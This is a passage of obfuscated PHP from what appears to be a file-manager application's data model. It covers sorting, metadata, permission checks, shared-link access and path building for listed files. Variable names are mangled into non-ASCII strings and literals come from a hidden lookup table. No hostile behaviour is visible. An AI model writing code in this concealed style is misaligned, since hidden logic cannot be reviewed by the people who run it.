$Ÿ¡³—èí = $this->_makeOrder(!0); $è‰õñõ = $Úë¿¥¢Š[478] . str_replace($Úë¿¥¢Š[50], $Úë¿¥¢Š[479], $Ÿ¡³—èí[0]); if (strpos($è‰õñõ, $Úë¿¥¢Š[483])) { $è‰õñõ = str_replace($Úë¿¥¢Š[483], $Úë¿¥¢Š[484], $è‰õñõ); } else { $è‰õñõ .= $Úë¿¥¢Š[485] . $Ÿ¡³—èí[1]; } $úıÅÄÒÖ = array(); foreach ($›Šêü¥Í as $ãõ‘û³ã => $Á§ßîùß) { $úıÅÄÒÖ[$Úë¿¥¢Š[478] . $ãõ‘û³ã] = $Á§ßîùß; } $this->alias($Úë¿¥¢Š[486])->field($……ïï™)->limit($ˆ¦ßüş‰)->order($è‰õñõ); $¡Ô”Á¸ø = $this->join($ãôÇîÛ)->where($úıÅÄÒÖ)->select(); if ($¡Ô”Á¸ø) { $äúÜãš[$Úë¿¥¢Š[412]] = $¡Ô”Á¸ø; } } protected function _makeOrder($Ğ¤Ö«« = false) { $–îßÏ =& $_SERVER[™»È’øè]; $°„¬ ½ƒ = Model($–îßÏ[487])->get($–îßÏ[488]); $ÂÆı¹÷‡ = Model($–îßÏ[487])->get($–îßÏ[489]); $ŒÓ„¤„¡ = array($–îßÏ[490] => $–îßÏ[491], $–îßÏ[492] => $–îßÏ[493]); $­©Œ»ÄÓ = array($–îßÏ[32] => $–îßÏ[32], $–îßÏ[76] => $–îßÏ[76], $–îßÏ[174] => $–îßÏ[453], $–îßÏ[494] => $–îßÏ[494], $–îßÏ[495] => $–îßÏ[496], $–îßÏ[214] => $–îßÏ[214], $–îßÏ[85] => $–îßÏ[85]); $à·Å´Î = Input::get($–îßÏ[497], $–îßÏ[7], $°„¬ ½ƒ, array_keys($­©Œ»ÄÓ)); $Şúáğ²û = Input::get($–îßÏ[498], $–îßÏ[7], $ÂÆı¹÷‡, array_keys($ŒÓ„¤„¡)); if (!in_array($à·Å´Î, array_keys($­©Œ»ÄÓ))) { $à·Å´Î = $–îßÏ[32]; } if (!in_array($Şúáğ²û, array_keys($ŒÓ„¤„¡))) { $à·Å´Î = $–îßÏ[490]; } if ($à·Å´Î == $–îßÏ[32]) { } $™ÂŸ€ ó = $–îßÏ[499] . $­©Œ»ÄÓ[$à·Å´Î] . $–îßÏ[53] . $ŒÓ„¤„¡[$Şúáğ²û]; $™ÂŸ€ ó = rtrim(trim($™ÂŸ€ ó), $–îßÏ[50]); if ($Ğ¤Ö««) { return array($™ÂŸ€ ó, $ŒÓ„¤„¡[$Şúáğ²û]); } return $this->order($™ÂŸ€ ó); } protected function _listDataApplyItem($ ›Ñü€¬, $ı¶ƒ™ = false) { $ÅªÚº· = array($ ›Ñü€¬); $this->_listDataApply($ÅªÚº·, $ı¶ƒ™); return $ÅªÚº·[0]; } protected function _listDataApply(&$ıááóßø, $³ƒå¡Ò– = false) { $îáä ¾Ë =& $_SERVER[™»È’øè]; if (!$ıááóßø) { $ıááóßø = array(); return; } $÷Õ ×Ë = array_to_keyvalue($ıááóßø, $îáä ¾Ë[12], $îáä ¾Ë[180]); $÷Õ ×Ë = array_unique($÷Õ ×Ë); $this->_listSourceCache($ıááóßø); if (!$³ƒå¡Ò–) { $this->_listAppendMeta($ıááóßø, $÷Õ ×Ë); $this->_listAppendFileMeta($ıááóßø, $÷Õ ×Ë); $this->_listAppendChildren($ıááóßø, $÷Õ ×Ë); } $this->_listAppendPath($ıááóßø); $this->_listAppendAuth($ıááóßø); $this->_listAppendSourceInfo($ıááóßø, $÷Õ ×Ë); $this->_listAppendUser($ıááóßø); $this->_listFilterInfo($ıááóßø, $³ƒå¡Ò–); $this->_listAppendAuthSecret($ıááóßø); } protected function _listSourceCache($Ğ³“‡¢Ò) { $òŒÔ¥òü =& $_SERVER[™»È’øè]; foreach ($Ğ³“‡¢Ò as $¢¦Å˜Ë ) { self::$cacheSourceInfo[$òŒÔ¥òü[500] . $¢¦Å˜Ë [$òŒÔ¥òü[180]]] = $¢¦Å˜Ë ; } } protected function _listFilterInfo(&$Ü’¿•—, $œ‰èêÀ = false) { $Û¨¿ö÷Ş =& $_SERVER[™»È’øè]; foreach ($Ü’¿•— as &$üø­‹ìÎ) { $üø­‹ìÎ = $this->pathInfoFilter($üø­‹ìÎ); self::$cachePathInfo[$Û¨¿ö÷Ş[501] . intval($œ‰èêÀ) . $Û¨¿ö÷Ş[429] . $üø­‹ìÎ[$Û¨¿ö÷Ş[180]]] = $üø­‹ìÎ; } unset($üø­‹ìÎ); } protected function _listMake(&$°–ğ¸º) { $ßô®Ğ© =& $_SERVER[™»È’øè]; $°–ğ¸º[$ßô®Ğ©[82]] = array(); $°–ğ¸º[$ßô®Ğ©[83]] = array(); foreach ($°–ğ¸º[$ßô®Ğ©[412]] as $ÒÌ°Ä„´) { $¬ïÜç¹é = $ÒÌ°Ä„´[$ßô®Ğ©[452]] == 1 ? $ßô®Ğ©[82] : $ßô®Ğ©[83]; $°–ğ¸º[$¬ïÜç¹é][] = $ÒÌ°Ä„´; } unset($°–ğ¸º[$ßô®Ğ©[412]]); } protected function _listAppendMeta(&$·ã »£½, $™ß˜•µ) { $ ¶ÔÈ¢ş =& $_SERVER[™»È’øè]; $ëôçå¥Ã = array($ ¶ÔÈ¢ş[458] => array($ ¶ÔÈ¢ş[459], $™ß˜•µ)); $”ÎÏ»şÌ = Model($ ¶ÔÈ¢ş[502])->field($ ¶ÔÈ¢ş[503])->where($ëôçå¥Ã)->select(); if (!$”ÎÏ»şÌ) { return; } $¢š«ÜªÅ = array($ ¶ÔÈ¢ş[504], $ ¶ÔÈ¢ş[505], $ ¶ÔÈ¢ş[484]); $¾úûÒßÌ = array(); foreach ($”ÎÏ»şÌ as $Ôô¥©Ç§) { if (!isset($¾úûÒßÌ[$Ôô¥©Ç§[$ ¶ÔÈ¢ş[180]]])) { $¾úûÒßÌ[$Ôô¥©Ç§[$ ¶ÔÈ¢ş[180]]] = array(); } if (in_array($Ôô¥©Ç§[$ ¶ÔÈ¢ş[94]], $¢š«ÜªÅ)) { continue; } $¾úûÒßÌ[$Ôô¥©Ç§[$ ¶ÔÈ¢ş[180]]][$Ôô¥©Ç§[$ ¶ÔÈ¢ş[94]]] = $Ôô¥©Ç§[$ ¶ÔÈ¢ş[417]]; } foreach ($·ã »£½ as &$°‘ùÚÇï) { $°‘ùÚÇï[$ ¶ÔÈ¢ş[506]] = !1; if (isset($¾úûÒßÌ[$°‘ùÚÇï[$ ¶ÔÈ¢ş[180]]])) { $°‘ùÚÇï[$ ¶ÔÈ¢ş[506]] = $¾úûÒßÌ[$°‘ùÚÇï[$ ¶ÔÈ¢ş[180]]]; } if ($this->fileIsLock($°‘ùÚÇï) && $°‘ùÚÇï[$ ¶ÔÈ¢ş[454]]) { $òÊŠ–Ö = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $°‘ùÚÇï[$ ¶ÔÈ¢ş[454]][$ ¶ÔÈ¢ş[455]] = AuthModel::authDisable($°‘ùÚÇï[$ ¶ÔÈ¢ş[454]][$ ¶ÔÈ¢ş[455]], $òÊŠ–Ö); $°‘ùÚÇï[$ ¶ÔÈ¢ş[454]][$ ¶ÔÈ¢ş[507]][$ ¶ÔÈ¢ş[454]] = $°‘ùÚÇï[$ ¶ÔÈ¢ş[454]][$ ¶ÔÈ¢ş[455]]; } } unset($°‘ùÚÇï); } protected function _listAppendFileMeta(&$ºáñªë™, $¯¾ä§ğ) { $¡ª©çÎœ =& $_SERVER[™»È’øè]; $€¤°¾Ôı = array_to_keyvalue($ºáñªë™, $¡ª©çÎœ[12], $¡ª©çÎœ[508]); $€¤°¾Ôı = array_filter(array_unique($€¤°¾Ôı)); if (!$€¤°¾Ôı) { return; } $™¡ğ¬êì = array($¡ª©çÎœ[509] => array($¡ª©çÎœ[459], $€¤°¾Ôı)); $ŞÕ†÷îí = $¡ª©çÎœ[510]; $üªÉƒ˜œ = Model($¡ª©çÎœ[511])->field($ŞÕ†÷îí)->where($™¡ğ¬êì)->select(); $üªÉƒ˜œ = array_to_keyvalue($üªÉƒ˜œ, $¡ª©çÎœ[508]); $¥¥Ò” = Model($¡ª©çÎœ[512])->field($¡ª©çÎœ[513])->where($™¡ğ¬êì)->select(); $¥¥Ò” = $¥¥Ò” ? $¥¥Ò” : array(); $—˜¥«Ãü = array(); foreach ($¥¥Ò” as $×ÉºÔ) { if (!isset($—˜¥«Ãü[$×ÉºÔ[$¡ª©çÎœ[508]]])) { $—˜¥«Ãü[$×ÉºÔ[$¡ª©çÎœ[508]]] = array(); } $—˜¥«Ãü[$×ÉºÔ[$¡ª©çÎœ[508]]][$×ÉºÔ[$¡ª©çÎœ[94]]] = $×ÉºÔ[$¡ª©çÎœ[417]]; } foreach ($ºáñªë™ as &$áàşò³¨) { $÷Ô÷ƒ¶ = $áàşò³¨[$¡ª©çÎœ[508]]; if (!$÷Ô÷ƒ¶ || !is_array($üªÉƒ˜œ[$÷Ô÷ƒ¶])) { continue; } $²ÉÒÀ²œ = $üªÉƒ˜œ[$÷Ô÷ƒ¶]; $²ÉÒÀ²œ[$¡ª©çÎœ[76]] = $áàşò³¨[$¡ª©çÎœ[76]]; $²ÉÒÀ²œ[$¡ª©çÎœ[32]] = $áàşò³¨[$¡ª©çÎœ[32]]; if (!isset(self::$cacheFileInfo[$¡ª©çÎœ[514] . $÷Ô÷ƒ¶])) { self::$cacheFileInfo[$¡ª©çÎœ[514] . $÷Ô÷ƒ¶] = array_merge(array(), $²ÉÒÀ²œ); } unset($üªÉƒ˜œ[$÷Ô÷ƒ¶][$¡ª©çÎœ[84]]); $ŒÀ÷•º = is_array($—˜¥«Ãü[$÷Ô÷ƒ¶]) ? $—˜¥«Ãü[$÷Ô÷ƒ¶] : array(); $áàşò³¨[$¡ª©çÎœ[515]] = array_merge($ŒÀ÷•º, $üªÉƒ˜œ[$÷Ô÷ƒ¶]); if (isset($áàşò³¨[$¡ª©çÎœ[515]][$¡ª©çÎœ[170]])) { $áàşò³¨[$¡ª©çÎœ[170]] = json_decode($áàşò³¨[$¡ª©çÎœ[515]][$¡ª©çÎœ[170]], !0); unset($áàşò³¨[$¡ª©çÎœ[515]][$¡ª©çÎœ[170]]); } } unset($áàşò³¨); } protected function _listAppendSourceInfo(&$¬–¾Ú¨ê, $·—ò­‚„) { $§Ä­‡ =& $_SERVER[™»È’øè]; $øµşû¨ = Model($§Ä­‡[516])->listData(); $”†ïâ¹ = Model($§Ä­‡[466])->listData(); $›™Ü¯°Ò = Model($§Ä­‡[456])->listData(); $ÜÕÉÊàÖ = Model($§Ä­‡[517])->listSimple(); $ÕÔï–‡° = array_to_keyvalue($øµşû¨, $§Ä­‡[442]); $€¯âı = array_to_keyvalue_group($”†ïâ¹, $§Ä­‡[84], $§Ä­‡[467]); $ïıåó¸ = array_to_keyvalue($›™Ü¯°Ò, $§Ä­‡[84]); $‰Öü³£÷ = array_to_keyvalue_group($ÜÕÉÊàÖ, $§Ä­‡[180]); foreach ($¬–¾Ú¨ê as &$Í˜ûñ¬ö) { $Í˜ûñ¬ö[$§Ä­‡[87]] = array($§Ä­‡[518] => 0, $§Ä­‡[519] => 0, $§Ä­‡[520] => 0); if (isset($ïıåó¸[$Í˜ûñ¬ö[$§Ä­‡[180]]])) { $Í˜ûñ¬ö[$§Ä­‡[87]][$§Ä­‡[521]] = 1; $Í˜ûñ¬ö[$§Ä­‡[87]][$§Ä­‡[522]] = $ïıåó¸[$Í˜ûñ¬ö[$§Ä­‡[180]]][$§Ä­‡[32]]; } if ($€¯âı && $ÕÔï–‡° && isset($€¯âı[$Í˜ûñ¬ö[$§Ä­‡[180]]])) { $Í˜ûñ¬ö[$§Ä­‡[87]][$§Ä­‡[523]] = array(); foreach ($€¯âı[$Í˜ûñ¬ö[$§Ä­‡[180]]] as $š­üşÏ) { $Çüá Ø = $ÕÔï–‡°[$š­üşÏ]; $Í˜ûñ¬ö[$§Ä­‡[87]][$§Ä­‡[523]][] = array($§Ä­‡[524] => $Çüá Ø[$§Ä­‡[442]], $§Ä­‡[461] => $Çüá Ø[$§Ä­‡[32]], $§Ä­‡[525] => $Çüá Ø[$§Ä­‡[526]]); } } if ($‰Öü³£÷ && isset($‰Öü³£÷[$Í˜ûñ¬ö[$§Ä­‡[180]]])) { $Í˜ûñ¬ö[$§Ä­‡[87]][$§Ä­‡[527]] = array(); foreach ($‰Öü³£÷[$Í˜ûñ¬ö[$§Ä­‡[180]]] as $¢½ö·) { $ñ©ìÍ±’ = $§Ä­‡[528]; if ($¢½ö·[$§Ä­‡[529]] == $§Ä­‡[88]) { $ñ©ìÍ±’ .= $§Ä­‡[530]; } $Í˜ûñ¬ö[$§Ä­‡[87]][$§Ä­‡[527]] = array_field_key($¢½ö·, explode($§Ä­‡[50], $ñ©ìÍ±’)); } } } unset($Í˜ûñ¬ö); return $¬–¾Ú¨ê; } protected function _listAppendChildren(&$ºƒÌªã, $§êö§©Ë) { $­ÓÎ‘´Î =& $_SERVER[™»È’øè]; $ÕÙÍ¸—ò = array(); $«ŞØãÖ = array($­ÓÎ‘´Î[222] => 0, $­ÓÎ‘´Î[223] => 0); foreach ($ºƒÌªã as &$‹ÔÀÛ”¦) { if (!$‹ÔÀÛ”¦[$­ÓÎ‘´Î[452]]) { continue; } $ÕÙÍ¸—ò[] = $‹ÔÀÛ”¦[$­ÓÎ‘´Î[180]]; } unset($‹ÔÀÛ”¦); if (!$ÕÙÍ¸—ò) { return; } $Ó”™Œİ© = array($­ÓÎ‘´Î[179] => array($­ÓÎ‘´Î[7], $ÕÙÍ¸—ò), $­ÓÎ‘´Î[472] => 0); $·˜œù¶Í = array($­ÓÎ‘´Î[179], $­ÓÎ‘´Î[452], $­ÓÎ‘´Î[531] => $­ÓÎ‘´Î[532]); $¹°‰¼˜Å = $this->field($·˜œù¶Í)->where($Ó”™Œİ©)->group($­ÓÎ‘´Î[533])->select(); $Ô†Ö¥Â– = array(); foreach ($¹°‰¼˜Å as $ûä¼š»–) { $š™Ğ–Ó = $ûä¼š»–[$­ÓÎ‘´Î[179]]; $øŒé¬ãÉ = $ûä¼š»–[$­ÓÎ‘´Î[452]] == $­ÓÎ‘´Î[88] ? $­ÓÎ‘´Î[223] : $­ÓÎ‘´Î[222]; if (!isset($Ô†Ö¥Â–[$š™Ğ–Ó])) { $Ô†Ö¥Â–[$š™Ğ–Ó] = array($­ÓÎ‘´Î[222] => 0, $­ÓÎ‘´Î[223] => 0); } $Ô†Ö¥Â–[$š™Ğ–Ó][$øŒé¬ãÉ] += $ûä¼š»–[$­ÓÎ‘´Î[532]]; } foreach ($ºƒÌªã as &$‹ÔÀÛ”¦) { if (!$‹ÔÀÛ”¦[$­ÓÎ‘´Î[452]]) { continue; } $…§”„÷Û = is_array($Ô†Ö¥Â–[$‹ÔÀÛ”¦[$­ÓÎ‘´Î[180]]]) ? $Ô†Ö¥Â–[$‹ÔÀÛ”¦[$­ÓÎ‘´Î[180]]] : $«ŞØãÖ; $‹ÔÀÛ”¦[$­ÓÎ‘´Î[223]] = $…§”„÷Û[$­ÓÎ‘´Î[223]]; $‹ÔÀÛ”¦[$­ÓÎ‘´Î[222]] = $…§”„÷Û[$­ÓÎ‘´Î[222]]; unset($‹ÔÀÛ”¦[$­ÓÎ‘´Î[453]]); } unset($‹ÔÀÛ”¦); } protected function _listAppendAuth(&$†”»éÙ¤) { $¨‡Áêµ‚ =& $_SERVER[™»È’øè]; $»¦ĞúÙ° = array(); foreach ($†”»éÙ¤ as $ŸšËé¹à) { if ($ŸšËé¹à[$¨‡Áêµ‚[177]] == self::TYPE_GROUP) { $»¦ĞúÙ°[] = $ŸšËé¹à[$¨‡Áêµ‚[180]]; } } if (!$»¦ĞúÙ°) { return; } $åØ”å•Ô = array_to_keyvalue($†”»éÙ¤, $¨‡Áêµ‚[180]); $è¬©£š = Model($¨‡Áêµ‚[534])->getSourceList($»¦ĞúÙ°, $åØ”å•Ô); $õ™üÖÅË = $GLOBALS[$¨‡Áêµ‚[535]] == 1; foreach ($†”»éÙ¤ as $ŸÍĞï† => &$ŸšËé¹à) { $ŸšËé¹à[$¨‡Áêµ‚[454]] = $è¬©£š[$ŸšËé¹à[$¨‡Áêµ‚[180]]]; if (!$ŸšËé¹à[$¨‡Áêµ‚[454]] && $ŸšËé¹à[$¨‡Áêµ‚[177]] == self::TYPE_GROUP) { $ŸšËé¹à[$¨‡Áêµ‚[454]] = Action($¨‡Áêµ‚[536])->pathGroupAuthMake($ŸšËé¹à[$¨‡Áêµ‚[537]]); if (!$ŸšËé¹à[$¨‡Áêµ‚[454]] && !$õ™üÖÅË) { $ŸšËé¹à[$¨‡Áêµ‚[216]] = !1; $ŸšËé¹à[$¨‡Áêµ‚[215]] = !1; } } if ($ŸšËé¹à[$¨‡Áêµ‚[454]]) { $ŸšËé¹à[$¨‡Áêµ‚[216]] = AuthModel::authCheckEdit($ŸšËé¹à[$¨‡Áêµ‚[454]][$¨‡Áêµ‚[455]]); $ŸšËé¹à[$¨‡Áêµ‚[215]] = AuthModel::authCheckView($ŸšËé¹à[$¨‡Áêµ‚[454]][$¨‡Áêµ‚[455]]); } $this->groupPathDisplay($ŸšËé¹à); } unset($ŸšËé¹à); } public function _listAppendAuthSecret(&$ù²óŸşÆ) { $×åıˆ±Ñ =& $_SERVER[™»È’øè]; if (Model($×åıˆ±Ñ[475])->get($×åıˆ±Ñ[538]) != $×åıˆ±Ñ[88]) { return; } static $ºçïŸ½– = false; if (!$ºçïŸ½–) { $˜‘¢Ôß = Model($×åıˆ±Ñ[539]); $Â—½¿Úó = Model($×åıˆ±Ñ[540]); $ºçïŸ½– = $Â—½¿Úó->listData(); $ºçïŸ½– = array_to_keyvalue($ºçïŸ½–, $×åıˆ±Ñ[180]); $á§¨òÕË = json_decode(Model($×åıˆ±Ñ[475])->get($×åıˆ±Ñ[541]), !0); $á§¨òÕË = array_to_keyvalue($á§¨òÕË, $×åıˆ±Ñ[442]); foreach ($ºçïŸ½– as $ÓëÅóÀ => $ÂŒ…ï§å) { $¾›åŠ× = $á§¨òÕË[$ÂŒ…ï§å[$×åıˆ±Ñ[542]]]; if (!$¾›åŠ×) { $Â—½¿Úó->remove($ÂŒ…ï§å[$×åıˆ±Ñ[442]]); unset($ºçïŸ½–[$ÓëÅóÀ]); continue; } $ã”ÍÈè¼ = $˜‘¢Ôß->listData($¾›åŠ×[$×åıˆ±Ñ[454]]); if (!$ã”ÍÈè¼) { $Â—½¿Úó->remove($ÂŒ…ï§å[$×åıˆ±Ñ[442]]); unset($ºçïŸ½–[$ÓëÅóÀ]); continue; } $ÂŒ…ï§å[$×åıˆ±Ñ[454]] = $ã”ÍÈè¼; $ÂŒ…ï§å[$×åıˆ±Ñ[543]] = $¾›åŠ×; $ÂŒ…ï§å[$×åıˆ±Ñ[544]] = Model($×åıˆ±Ñ[545])->getInfoSimpleOuter($ÂŒ…ï§å[$×åıˆ±Ñ[494]]); $ºçïŸ½–[$ÓëÅóÀ] = $ÂŒ…ï§å; } } $ß«õîÃ” = USER_ID; $ñä½ñºö = array(); $ùïÉùâƒ = $this->_listAppendPath($ñä½ñºö, !0); foreach ($ù²óŸşÆ as $ÓëÅóÀ => &$ÂŒ…ï§å) { if (!is_array($ÂŒ…ï§å[$×åıˆ±Ñ[454]])) { continue; } if ($ÂŒ…ï§å[$×åıˆ±Ñ[177]] != $×åıˆ±Ñ[546]) { continue; } if (isset($ºçïŸ½–[$ÂŒ…ï§å[$×åıˆ±Ñ[180]]])) { $“ŞĞ¸ğ = $ºçïŸ½–[$ÂŒ…ï§å[$×åıˆ±Ñ[180]]]; if (!is_array($ÂŒ…ï§å[$×åıˆ±Ñ[506]])) { $ÂŒ…ï§å[$×åıˆ±Ñ[506]] = array(); } $ÂŒ…ï§å[$×åıˆ±Ñ[506]][$×åıˆ±Ñ[547]] = $“ŞĞ¸ğ[$×åıˆ±Ñ[542]]; $ÂŒ…ï§å[$×åıˆ±Ñ[454]][$×åıˆ±Ñ[548]] = $“ŞĞ¸ğ; $ÂŒ…ï§å[$×åıˆ±Ñ[454]][$×åıˆ±Ñ[549]] = $ÂŒ…ï§å[$×åıˆ±Ñ[550]]; $ÂŒ…ï§å[$×åıˆ±Ñ[454]][$×åıˆ±Ñ[551]] = $×åıˆ±Ñ[88]; if ($“ŞĞ¸ğ[$×åıˆ±Ñ[494]] != $ß«õîÃ”) { $ÂŒ…ï§å[$×åıˆ±Ñ[454]][$×åıˆ±Ñ[455]] = $ÂŒ…ï§å[$×åıˆ±Ñ[454]][$×åıˆ±Ñ[455]] & $“ŞĞ¸ğ[$×åıˆ±Ñ[454]][$×åıˆ±Ñ[454]]; } continue; } $©ìíÎ’Ô = $this->parentLevelArray($ÂŒ…ï§å[$×åıˆ±Ñ[552]]); $»ıÔ„£Ÿ = array_reverse($©ìíÎ’Ô); foreach ($»ıÔ„£Ÿ as $ï“¤À–­ => $¡…Øöìˆ) { if (!isset($ºçïŸ½–[$¡…Øöìˆ])) { continue; } $“ŞĞ¸ğ = $ºçïŸ½–[$¡…Øöìˆ]; $ÂŒ…ï§å[$×åıˆ±Ñ[454]][$×åıˆ±Ñ[548]] = $“ŞĞ¸ğ; if ($“ŞĞ¸ğ[$×åıˆ±Ñ[494]] != $ß«õîÃ”) { $ÂŒ…ï§å[$×åıˆ±Ñ[454]][$×åıˆ±Ñ[455]] = $ÂŒ…ï§å[$×åıˆ±Ñ[454]][$×åıˆ±Ñ[455]] & $“ŞĞ¸ğ[$×åıˆ±Ñ[454]][$×åıˆ±Ñ[454]]; } $òÂ§ƒ•õ = $×åıˆ±Ñ[12]; $”©ØØ£ï = count($©ìíÎ’Ô) - $ï“¤À–­; for ($†²ÅÆç– = 0; $†²ÅÆç– < $”©ØØ£ï; $†²ÅÆç–++) { if (!isset($ùïÉùâƒ[$©ìíÎ’Ô[$†²ÅÆç–]])) { $òÂ§ƒ•õ = $×åıˆ±Ñ[12]; break; } $òÂ§ƒ•õ = $òÂ§ƒ•õ . rtrim($ùïÉùâƒ[$©ìíÎ’Ô[$†²ÅÆç–]], $×åıˆ±Ñ[8]) . $×åıˆ±Ñ[8]; } $ÂŒ…ï§å[$×åıˆ±Ñ[454]][$×åıˆ±Ñ[549]] = rtrim($òÂ§ƒ•õ, $×åıˆ±Ñ[8]) . $×åıˆ±Ñ[8]; break; } } unset($ÂŒ…ï§å); } public function groupPathDisplay(&$Î³É‹ÂÑ) { $µÚçŒ¨¸ =& $_SERVER[™»È’øè]; if ($Î³É‹ÂÑ[$µÚçŒ¨¸[177]] != self::TYPE_GROUP) { return; } $±Ëí Ê = Model($µÚçŒ¨¸[553])->getInfo($Î³É‹ÂÑ[$µÚçŒ¨¸[537]]); $£ïŸ‚Ö¨ = $this->parentLevelArray($±Ëí Ê[$µÚçŒ¨¸[552]]); $Ğ¿Ì‘” = $µÚçŒ¨¸[12]; foreach ($£ïŸ‚Ö¨ as $ÊïÕ–ğÀ) { $«ÇÂö¿Æ = Model($µÚçŒ¨¸[553])->getInfo($ÊïÕ–ğÀ); $Ğ¿Ì‘” .= $«ÇÂö¿Æ[$µÚçŒ¨¸[87]][$µÚçŒ¨¸[180]] . $µÚçŒ¨¸[50]; } $Î³É‹ÂÑ[$µÚçŒ¨¸[554]] = $±Ëí Ê[$µÚçŒ¨¸[179]]; $Î³É‹ÂÑ[$µÚçŒ¨¸[555]] = $±Ëí Ê[$µÚçŒ¨¸[552]]; $Î³É‹ÂÑ[$µÚçŒ¨¸[556]] = $±Ëí Ê[$µÚçŒ¨¸[557]]; $Î³É‹ÂÑ[$µÚçŒ¨¸[558]] = $Ğ¿Ì‘” . $±Ëí Ê[$µÚçŒ¨¸[87]][$µÚçŒ¨¸[180]]; } protected function _listAppendPath(&$·Æ×Ë†×, $¥Î¥Ëé = false) { $é×Šš¦ =& $_SERVER[™»È’øè]; static $ï„›ŠõÛ = array(); $•¹³Úğ = array(); $’úªËÍ’ = array(); if ($¥Î¥Ëé) { return $ï„›ŠõÛ; } foreach ($·Æ×Ë†× as &$Ó‘Ó÷ûÖ) { $›£„éØ€ = $Ó‘Ó÷ûÖ[$é×Šš¦[180]]; if ($Ó‘Ó÷ûÖ[$é×Šš¦[452]] == $é×Šš¦[88] && $Ó‘Ó÷ûÖ[$é×Šš¦[179]] != 0) { $ï„›ŠõÛ[$›£„éØ€] = $Ó‘Ó÷ûÖ[$é×Šš¦[32]]; } if ($Ó‘Ó÷ûÖ[$é×Šš¦[452]] == $é×Šš¦[88] && $Ó‘Ó÷ûÖ[$é×Šš¦[179]] == 0) { $ï„›ŠõÛ[$›£„éØ€] = $this->_listAppendPathRoot($Ó‘Ó÷ûÖ, array()); } if (isset($’úªËÍ’[$Ó‘Ó÷ûÖ[$é×Šš¦[552]]])) { continue; } $’úªËÍ’[$Ó‘Ó÷ûÖ[$é×Šš¦[552]]] = !0; $µí·‡Ğ³ = $this->parentLevelArray($Ó‘Ó÷ûÖ[$é×Šš¦[552]]); foreach ($µí·‡Ğ³ as $Ê±şúÛÆ => $¡ææàëÙ) { if (isset($ï„›ŠõÛ[$¡ææàëÙ])) { continue; } if ($Ê±şúÛÆ == 0) { $ï„›ŠõÛ[$¡ææàëÙ] = $this->_listAppendPathRoot($Ó‘Ó÷ûÖ, $µí·‡Ğ³); } if ($Ê±şúÛÆ != 0) { $•¹³Úğ[] = $¡ææàëÙ; } } } unset($Ó‘Ó÷ûÖ); $•¹³Úğ = array_unique($•¹³Úğ); if (count($•¹³Úğ) > 0) { $Ü”‘è¨¦ = array($é×Šš¦[458] => array($é×Šš¦[459], $•¹³Úğ)); if (count($•¹³Úğ) == 1) { $Í·±¾‡ = $this->sourceInfo($•¹³Úğ[0]); $Å‘ÈÏŒ = is_array($Í·±¾‡) ? array($Í·±¾‡) : !1; } else { $Å‘ÈÏŒ = $this->field($é×Šš¦[559])->where($Ü”‘è¨¦)->select(); } if (!$Å‘ÈÏŒ) { $Å‘ÈÏŒ = array(); } foreach ($Å‘ÈÏŒ as $®à¸öµˆ) { $ï„›ŠõÛ[$®à¸öµˆ[$é×Šš¦[180]]] = $®à¸öµˆ[$é×Šš¦[32]]; } } $Š’–…è = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ŸçÙ”óŒ = array(); foreach ($·Æ×Ë†× as &$Ó‘Ó÷ûÖ) { $•âåó½¢ = $Ó‘Ó÷ûÖ[$é×Šš¦[552]]; $ôıªí = $é×Šš¦[12]; if (isset($ŸçÙ”óŒ[$•âåó½¢])) { $ôıªí = $ŸçÙ”óŒ[$•âåó½¢]; } else { $µí·‡Ğ³ = $this->parentLevelArray($Ó‘Ó÷ûÖ[$é×Šš¦[552]]); foreach ($µí·‡Ğ³ as $Ê±şúÛÆ => $¡ææàëÙ) { if (isset($ï„›ŠõÛ[$¡ææàëÙ])) { $ôıªí .= $ï„›ŠõÛ[$¡ææàëÙ] . $é×Šš¦[8]; } } $ŸçÙ”óŒ[$•âåó½¢] = $ôıªí; } $ôıªí .= $Ó‘Ó÷ûÖ[$é×Šš¦[32]]; if ($Ó‘Ó÷ûÖ[$é×Šš¦[452]] == $é×Šš¦[88]) { $ôıªí .= $é×Šš¦[8]; } $Ó‘Ó÷ûÖ[$é×Šš¦[550]] = str_replace($é×Šš¦[560], $é×Šš¦[8], $ôıªí); if ($Ó‘Ó÷ûÖ[$é×Šš¦[179]] == $é×Šš¦[211]) { $Ó‘Ó÷ûÖ[$é×Šš¦[32]] = trim($ï„›ŠõÛ[$Ó‘Ó÷ûÖ[$é×Šš¦[180]]], $é×Šš¦[8]); $Ó‘Ó÷ûÖ[$é×Šš¦[550]] = $Ó‘Ó÷ûÖ[$é×Šš¦[32]] . $é×Šš¦[8]; } if (intval($Ó‘Ó÷ûÖ[$é×Šš¦[177]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Ó‘Ó÷ûÖ, $µí·‡Ğ³, $Š’–…è); } } unset($Ó‘Ó÷ûÖ); return $·Æ×Ë†×; } private function _listAppendPathRecycle(&$íáæ£Ù, $ş×¬ “´, $Ò…‹²™è) { $Û¥³Ã…Ï =& $_SERVER[™»È’øè]; if (!in_array($Ò…‹²™è, $ş×¬ “´) && $íáæ£Ù[$Û¥³Ã…Ï[180]] != $Ò…‹²™è) { return; } $ëÈØä‘ = explode($Û¥³Ã…Ï[8], trim($íáæ£Ù[$Û¥³Ã…Ï[550]], $Û¥³Ã…Ï[8])); $ÉøƒòÉç = implode($Û¥³Ã…Ï[8], array_slice($ëÈØä‘, 2)); $íáæ£Ù[$Û¥³Ã…Ï[550]] = $Û¥³Ã…Ï[8] . LNG($Û¥³Ã…Ï[561]) . $Û¥³Ã…Ï[8] . ltrim($ÉøƒòÉç, $Û¥³Ã…Ï[8]); $íáæ£Ù[$Û¥³Ã…Ï[552]] = $Û¥³Ã…Ï[562] . implode($Û¥³Ã…Ï[50], array_slice($ş×¬ “´, 1)) . $Û¥³Ã…Ï[50]; if ($íáæ£Ù[$Û¥³Ã…Ï[180]] == $Ò…‹²™è) { $íáæ£Ù[$Û¥³Ã…Ï[552]] = $Û¥³Ã…Ï[562]; $íáæ£Ù[$Û¥³Ã…Ï[179]] = $Û¥³Ã…Ï[211]; $íáæ£Ù[$Û¥³Ã…Ï[32]] = LNG($Û¥³Ã…Ï[561]); } $íáæ£Ù[$Û¥³Ã…Ï[563]] = $Û¥³Ã…Ï[564]; } protected function _listAppendPathRoot(&$äÏŸÊÚ‘, $‚èìºøæ) { $ÇŒÌ¥Ìè =& $_SERVER[™»È’øè]; static $˜Şó¶¤† = false; $¥óöËóÜ = $ÇŒÌ¥Ìè[12]; if 